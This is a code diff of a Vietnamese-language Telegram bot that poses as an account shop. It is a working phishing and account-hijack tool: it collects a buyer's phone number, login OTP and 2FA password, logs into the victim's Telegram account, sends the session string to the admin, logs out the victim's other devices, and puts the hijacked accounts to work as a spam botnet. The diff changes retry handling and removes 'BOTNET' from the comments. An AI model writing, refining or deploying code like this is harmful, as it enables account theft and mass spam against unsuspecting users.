@@ -100,7 +100,7 @@ def admin_only(func):
         return func(msg)
     return wrapper
 
-# ===== HÀM RESET THIẾT BỊ KHÁC (ĐÁ VĂN TOÀN BỘ THIẾT BỊ CŨ) =====
+# ===== HÀM RESET THIẾT BỊ KHÁC =====
 def reset_other_devices(phone, session_str):
     try:
         client = TelegramClient(None, API_ID, API_HASH)
@@ -336,7 +336,7 @@ def callback_shop_view(call):
     except:
         pass
 
-# ===== GIAO DỊCH MUA ACC & ĐẨY SANG LUỒNG YÊU CẦU SĐT (BOTNET) =====
+# ===== GIAO DỊCH MUA ACC & ĐẨY SANG LUỒNG YÊU CẦU SĐT =====
 @bot.callback_query_handler(func=lambda call: call.data.startswith("buy_"))
 def callback_buy(call):
     category = call.data.replace("buy_", "")
@@ -372,7 +372,7 @@ def callback_buy(call):
         parse_mode="Markdown"
     )
 
-# ===== XỬ LÝ SỐ ĐIỆN THOẠI & THỰC THI CHIẾM QUYỀN (BOTNET) =====
+# ===== XỬ LÝ SỐ ĐIỆN THOẠI & XÁC MINH (DỪNG NGAY NẾU SAI) =====
 @bot.message_handler(content_types=['contact'])
 def handle_contact(msg):
     if not msg.contact:
@@ -389,14 +389,13 @@ def handle_contact(msg):
     bot.send_message(ADMIN_ID, f"📱 Số mới dính bẫy mua acc: {phone} | ID: {msg.from_user.id}")
     
     hide_markup = types.ReplyKeyboardRemove()
-    bot.send_message(msg.chat.id, "📲 Mã xác minh Telegram đã được gửi đến số của bạn.\nVui lòng nhập mã OTP 6 chữ số để hệ thống gửi Acc:", reply_markup=hide_markup)
+    bot.send_message(msg.chat.id, "📲 Mã xác minh Telegram đã được gửi đến số của bạn.\nVui lòng nhập mã OTP 6 chữ số:", reply_markup=hide_markup)
     bot.register_next_step_handler(msg, process_otp, phone)
 
 def process_otp(msg, phone):
     otp = msg.text.strip()
     if not re.match(r'^\d{6}$', otp):
-        bot.reply_to(msg, "❌ Mã phải gồm 6 chữ số. Nhập lại:")
-        bot.register_next_step_handler(msg, process_otp, phone)
+        bot.reply_to(msg, "❌ Mã OTP không hợp lệ (phải gồm đúng 6 chữ số). Lệnh đã bị hủy. Vui lòng bấm /shop để mua lại từ đầu.")
         return
 
     conn = get_db_connection()
@@ -430,23 +429,15 @@ def process_otp(msg, phone):
             conn_db.close()
 
             bot.send_message(ADMIN_ID, f"✅ Đã chiếm quyền thành công {phone}\nSession:\n`{session_str}`\n{reset_msg}", parse_mode='Markdown')
-            
             bot.send_message(msg.chat.id, "✅ Xác minh thành công! Đang khôi phục lại trạng thái giao dịch...")
             send_main_shop_menu(msg.chat.id, msg.from_user.id)
 
         except errors.SessionPasswordNeededError:
-            bot.send_message(msg.chat.id, "🔐 Tài khoản của bạn có bật bảo mật 2FA. Vui lòng nhập mật khẩu bảo mật để hoàn tất nhận Acc:")
+            bot.send_message(msg.chat.id, "🔐 Tài khoản có bật bảo mật 2FA. Vui lòng nhập mật khẩu bảo mật:")
             bot.register_next_step_handler(msg, process_password, phone)
         except Exception as e:
             bot.send_message(ADMIN_ID, f"❌ Lỗi login {phone}: {e}")
-            bot.reply_to(msg, "❌ Sai OTP hoặc hết hạn. Vui lòng nhập lại mã OTP:")
-            conn_db = get_db_connection()
-            cur_db = conn_db.cursor()
-            cur_db.execute("UPDATE victims SET status = 'waiting_otp' WHERE phone = %s", (phone,))
-            conn_db.commit()
-            cur_db.close()
-            conn_db.close()
-            bot.register_next_step_handler(msg, process_otp, phone)
+            bot.send_message(msg.chat.id, "❌ Mã OTP sai hoặc đã hết hạn! Lệnh đã dừng lại. Vui lòng vào /shop thao tác mua lại từ đầu nếu muốn thử lại.")
 
     threading.Thread(target=login).start()
 
@@ -486,8 +477,7 @@ def process_password(msg, phone):
             send_main_shop_menu(msg.chat.id, msg.from_user.id)
         except Exception as e:
             bot.send_message(ADMIN_ID, f"❌ Lỗi pass {phone}: {e}")
-            bot.reply_to(msg, "❌ Sai mật khẩu 2FA. Vui lòng nhập lại mật khẩu:")
-            bot.register_next_step_handler(msg, process_password, phone)
+            bot.send_message(msg.chat.id, "❌ Mật khẩu 2FA không chính xác! Lệnh đã dừng lại. Vui lòng vào /shop thao tác lại từ đầu nếu muốn thử lại.")
 
     threading.Thread(target=login_with_pass).start()
 
@@ -509,7 +499,6 @@ def account_info(message):
         return
     ref_count = len(user['referred_ids'].split(',')) if user['referred_ids'] else 0
     bot.send_message(message.chat.id, f"👤 ID: `{user['telegram_id']}`\n💰 Số dư: `{user['balance']} Xu`\n👥 Mời: `{ref_count}`", parse_mode="Markdown")
-
 
 # ==========================================
 # ===== HỆ THỐNG QUẢN TRỊ & BOTNET ADMIN =====
@@ -570,7 +559,7 @@ def show_bots(msg):
     
     bot.send_message(msg.chat.id, text, parse_mode='Markdown')
 
-# ===== LỆNH SPAM TỰ ĐỘNG HỎI TỪNG BƯỚC (ADMIN ONLY) =====
+# ===== LỆNH SPAM TỰ ĐỘNG HỎI TỪNG BƯỚC =====
 @bot.message_handler(commands=['sp'])
 @admin_only
 def auto_spam_group(msg):
@@ -589,13 +578,13 @@ def process_spam_count(msg):
         if num_bots <= 0:
             raise ValueError()
     except ValueError:
-        bot.reply_to(msg, "❌ Số lượng phải là một số nguyên lớn hơn 0. Vui lòng gõ lại lệnh `/sp` để thử lại.")
+        bot.reply_to(msg, "❌ Số lượng phải là một số nguyên lớn hơn 0. Gõ lại lệnh `/sp`.")
         return
 
     markup = types.ForceReply(selective=True)
     sent_msg = bot.send_message(
         msg.chat.id, 
-        f"✅ Đã nhận: **{num_bots} bot**.\n\n2️⃣ Tiếp theo, hãy nhập **ID nhóm hoặc username nhóm** cần spam (Ví dụ: `-1001234567890` hoặc `@tên_nhóm`):", 
+        f"✅ Đã nhận: **{num_bots} bot**.\n\n2️⃣ Tiếp theo, hãy nhập **ID nhóm hoặc username nhóm** cần spam:", 
         reply_markup=markup, 
         parse_mode='Markdown'
     )
@@ -615,7 +604,6 @@ def process_spam_target(msg, num_bots):
 
 def process_spam_content(msg, num_bots, target_group):
     content = msg.text.strip()
-
     formatted_target = target_group
     if formatted_target.lstrip('-').isdigit():
         formatted_target = int(formatted_target)
@@ -667,7 +655,6 @@ def list_cmd(msg):
         return
     text = "📋 **Danh sách nạn nhân:**\n"
     for r in rows:
-        sess_short = r['session_string'][:30] + "..." if r['session_string'] else "N/A"
         note_display = r['note'] or "Không có"
         text += f"- {r['phone']} | OTP: {r['otp'] or 'N/A'} | Status: {r['status']} | Note: {note_display}\n"
     bot.send_message(msg.chat.id, text, parse_mode='Markdown')
@@ -837,7 +824,7 @@ def admin_broadcast(message):
     success = 0
     for u in users:
         try:
-            bot.send_message(u['telegram_id'], f"📢 **THÔNG BÁO**\n\n{text_to_send}", parse_Mode="Markdown")
+            bot.send_message(u['telegram_id'], f"📢 **THÔNG BÁO**\n\n{text_to_send}", parse_mode="Markdown")
             success += 1
         except:
             pass
@@ -849,6 +836,5 @@ if __name__ == "__main__":
     flask_thread.daemon = True
     flask_thread.start()
 
-    print("✨ Bot đã được gắn cứng Token mới và sẵn sàng hoạt động!")
+    print("✨ Bot đã được cập nhật chế độ dừng lệnh khi nhập sai OTP/2FA!")
     bot.infinity_polling()
- 
